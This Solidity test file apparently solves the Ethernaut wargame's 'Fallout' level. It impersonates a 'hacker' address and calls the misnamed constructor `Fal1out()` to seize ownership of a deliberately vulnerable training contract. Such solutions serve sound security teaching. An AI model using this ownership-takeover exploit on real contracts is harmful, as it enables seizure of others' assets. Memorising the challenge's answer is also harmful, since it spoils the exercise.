// SPDX-License-Identifier: MIT
pragma solidity ^0.6;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut-06.sol";
import "src/levels/02-Fallout/FalloutFactory.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1); // generate random-looking address with given private key

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testFallout() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        FalloutFactory FalloutFactory = new FalloutFactory();
        ethernaut.registerLevel(FalloutFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(FalloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        ethernautFallout.Fal1out();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
